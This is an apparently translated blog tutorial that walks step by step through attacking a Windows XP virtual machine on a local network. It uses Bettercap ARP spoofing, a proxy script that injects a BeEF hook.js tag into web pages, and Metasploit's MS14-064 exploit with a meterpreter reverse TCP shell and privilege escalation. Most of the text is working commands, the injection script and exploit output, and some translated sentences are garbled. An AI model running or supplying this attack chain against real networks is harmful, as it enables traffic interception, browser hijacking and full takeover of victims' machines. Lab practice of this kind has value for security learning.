# LAN Penetration Testing with Beef, Bettercap, and Other Tools


<!--more-->
## Introduction

Well... Let's start with some rambling as usual...

Today, I tried using Beef and Bettercap together and found them to be quite effective~

Also, if you are using Internet Explorer (IE), you can use Beef in conjunction with the ms14-064 module in Metasploit to gain system privileges~

Without further ado, let's get started~

### Testing Environment

First, let's talk about the testing environment.

* Attacker machine
    * Arch Linux
    * 192.168.101.15

* Target machine
    * Windows XP on VirtualBox
    * 192.168.101.43

Due to limited resources, we can only use Windows XP for this demonstration~

### Tools Used

1. Bettercap
    * First and foremost, Bettercap~ It is used for ARP spoofing, DNS hijacking, and network interruption attacks, which are all part of man-in-the-middle attacks...
2. Beef
    * Used for browser hijacking... and it can do many things, but I don't know the specifics.
3. Metasploit (msf)
    * Our old friend~

## Testing Process

First, let's open `bettercap`.

```bash
$ sudo bettercap
```

Then we will see the following output..

![](/img/2021-02-02_14-18.png)


**Note: You need to use sudo here because it requires root privileges to access network hardware such as network cards. If you don't use sudo, you will see a prompt like this.**


![](/img/2021-02-02_14-20.png)

Next, set the target for ARP spoofing:

```txt
set arp.spoof.targets 192.168.101.43
```

**Here, the targets are set to the IP address of the target machine.**

Next, start Beef, and remember to use `sudo` as mentioned earlier.

```bash
$ sudo beef
```

The output should be like this:

![](/img/2021-02-02_14-28.png)

Now, let's talk about the links displayed in the terminal:

* Hook URL:  [http://192.168.101.15:3000/hook.js](http://192.168.101.15:3000/hook.js)
    * This is the hook address mentioned earlier. Once a browser visits a page with this JavaScript, it will be hooked by Beef~
        Later, we will write it into an attack script~
* UI URL: [http://192.168.101.15:3000/ui/panel](http://192.168.101.15:3000/ui/panel)
    * This is the Beef control panel. After opening it, you will see a login page, similar to the cover image. After logging in, it will look like this.

![](/img/Screenshot_2021-02-02_BeEF_Control_Panel.png)

About the username and password, here's the thing: In some systems, you can't use the default login credentials `(beef:beef)` for Beef, and it may not even start. For example, this is the case with my Arch Linux.

```txt
[14:40:25][!] ERROR: Default username and password in use!
[14:40:25]    |_  Change the beef.credentials.passwd in config.yaml
```

In such cases, what you need to do is modify the `config.yaml` file. In my case, the file is located at `/usr/share/beef/config.yaml`.

Modify it as follows:

```yaml
beef:
    version: '0.5.0.0-alpha-pre'
    # More verbose messages (server-side)
    debug: false
    # More verbose messages (client-side)
    client_debug: false
    # Used for generating secure tokens
    crypto_default_value_length: 80

    # Credentials to authenticate in BeEF.
    # Used by both the RESTful API and the Admin interface
    credentials:
        user:   "Choose a username"
        passwd: "Think of a password"
```

After that, you can start the system, and the username and password you set will be used for login.

Alright, without further ado, let's continue.

Next, we need to write a JavaScript script to use with Bettercap.

```js
function onResponse(req,res){
    if(res.ContentType.indexOf('text/html')==0){
        var body=res.ReadBody();
        if(body.indexOf('</head>')!=-1){
            res.Body=body.replace(
                '</head>',
               '<script type="text/javascript" src="http://192.168.101.15:3000/hook.js"></script></head>'
            );
            }
        }
}
```

Save this file to a directory of your choice. I will save it to `/home/weepingdogel/Downloads/hack/192.168.101.43/hack.js`.

Then, let's go back to Bettercap and set the `http.proxy.script` parameter to the path mentioned above:

```txt
set http.proxy.script /home/weepingdogel/Downloads/hack/192.168.101.43/hack.js
```

Then start `net.probe`, `arp.spoof`, and `http.proxy` in sequence.

```txt
net.probe on
```

```txt
arp.spoof on
```

```txt
http.proxy on
```

Alright... Now everything is set up and ready to go...

![](/img/2021-02-02_15-12.png)

Then we'll have the target machine open a browser and visit a website...

Since IE8 no longer supports HTTPS for Bing, it will be vulnerable as soon as it opens.

![](/img/VirtualBox_XP_02_02_2021_15_25_46.png)

![](/img/2021-02-02_15-25.png)

And then there's so much we can do.

![](/img/2021-02-02_15-27.png)

I decided to use a clippy module that binds to a `ms14-064` address, and now it's msf's turn.

```bash
$ msfconsole
```

![](/img/2021-02-02_15-31.png)

Enable Modules.

```txt
> use exploit/windows/browser/ms14_064_ole_code_execution
```
```txt
> info 
```
Let's see the description.

>Description:
>
>  This module exploits the Windows OLE Automation array vulnerability, 
>  CVE-2014-6332. The vulnerability is known to affect Internet 
>  Explorer 3.0 until version 11 within Windows 95 up to Windows 10, 
>  and no patch for Windows XP. However, this exploit will only target 
>  Windows XP and Windows 7 box due to the Powershell limitation. 
>  Windows XP by defaults supports VBS, therefore it is used as the 
>  attack vector. On other newer Windows systems, the exploit will try 
>  using Powershell instead.


Check the options

```txt
show options
```

```txt
Module options (exploit/windows/browser/ms14_064_ole_code_execution):

   Name                   Current Setting  Required  Description
   ----                   ---------------  --------  -----------
   AllowPowershellPrompt  false            yes       Allow exploit to try Powershell
   Retries                true             no        Allow the browser to retry the module
   SRVHOST                0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT                8080             yes       The local port to listen on.
   SSL                    false            no        Negotiate SSL for incoming connections
   SSLCert                                 no        Path to a custom SSL certificate (default is randomly generated)
   TRYUAC                 false            yes       Ask victim to start as Administrator
   URIPATH                                 no        The URI to use for this exploit (default is random)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.101.15   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows XP
```
Normally we would just set a `SRVHOST`, but `bettercap` just took port `8080`, so we need to set a new `SRVPORT`.

The `SRVHOST` is set to the address of the attacking machine.

```txt
set SRVHOST 192.168.101.15
```

`SRVPORT` Arbitrarily specify a free port

```txt
set SRVPORT 9999
```

Execute.

```txt
exploit
```

Then we get it

```txt
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.101.15:4444 
[*] Using URL: http://192.168.101.15:9999/deCFhCIwXNHYT
[*] Server started.
```

Change the default `Clippy image directory` address to the attacker's address, then put the link `http://192.168.101.15:9999/deCFhCIwXNHYT` in the `Executable` field.

![](/img/2021-02-02_15-52.png)

Then click the `execute`.

That's when a funny thing happens to the target machine.

![](/img/VirtualBox_XP_02_02_2021_15_53_43.png)

Whichever one you click on, it jumps to the msf link.
After clicking on it, msf responds.

![](/img/2021-02-02_15-55.png)

A `meterpreter` connection is established.

![](/img/2021-02-02_15-57.png)

Get in the session.

```txt
sessions -i 1
```
![](/img/2021-02-02_15-59.png)

At this point we can use `meterpreter` to operate the target machine as normal...

![](/img/2021-02-02_16-00.png)

The `getsystem` lifting is also no problem.

As for the use of `meterpreter`, I will not continue to write about it, because I have written about it before (escape.).

Then here is half of the success, the rest is the post-penetration, say a long time can not finish it ~ ~ here it is ~

## End
I'm sorry, but I'm not sure if I'm going to be able to do this. qwq
However, to declare that the content of this article is limited to the test to learn to use, **do not take to do bad things**, or the consequences of their own Oh ~

Finally, this site follows the [CC-BY-NC 4.0 protocol] (https://creativecommons.org/licenses/by-nc/4.0/), reproduced please specify the source!

## Reference links

* [CVE-2014-6332 : OleAut32.dll in OLE in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows](https://cvedetails.com/cve/CVE-2014-6332/)
* [Microsoft Security Bulletin MS14-064 - Critical | Microsoft Docs](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/MS14-064)
* [Microsoft Internet Explorer 11 - OLE Automation Array Remote Code Execution (1) - Windows remote Exploit](https://www.exploit-db.com/exploits/35229)
* [Microsoft Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / PowerShell VirtualAlloc (MS14-064) - Windows remote Exploit](https://www.exploit-db.com/exploits/35308)
* [IBM X-Force Researcher Finds Significant Vulnerability in Microsoft Windows](http://securityintelligence.com/ibm-x-force-researcher-finds-significant-vulnerability-in-microsoft-windows)
* [CVE-2014-6332: it&#8217;s raining shells | forsec](https://forsec.nl/2014/11/cve-2014-6332-internet-explorer-msf-module)
* [kali bettercap的使用 | UsstZt](https://usstzt.site/2020/05/26/bettercap%E7%9A%84%E4%BD%BF%E7%94%A8/#&gid=1&pid=2)
* [Bettercap2.6与beef的使用_请你吃橘子-CSDN博客](https://blog.csdn.net/qq_33066259/article/details/80737308)
* [DeepL Translate](https://www.deepl.com/translator#en/zh/This%20module%20exploits%20the%20Windows%20OLE%20Automation%20array%20vulnerability%2C%20CVE-2014-6332.%20The%20vulnerability%20is%20known%20to%20affect%20Internet%20Explorer%203.0%20until%20version%2011%20within%20Windows%2095%20up%20to%20Windows%2010%2C%20and%20no%20patch%20for%20Windows%20XP.%20However%2C%20this%20exploit%20will%20only%20target%20Windows%20XP%20and%20Windows%207%20box%20due%20to%20the%20Powershell%20limitation.%20Windows%20XP%20by%20defaults%20supports%20VBS%2C%20therefore%20it%20is%20used%20as%20the%20attack%20vector.%20On%20other%20newer%20Windows%20systems%2C%20the%20exploit%20will%20try%20using%20Powershell%20instead.)


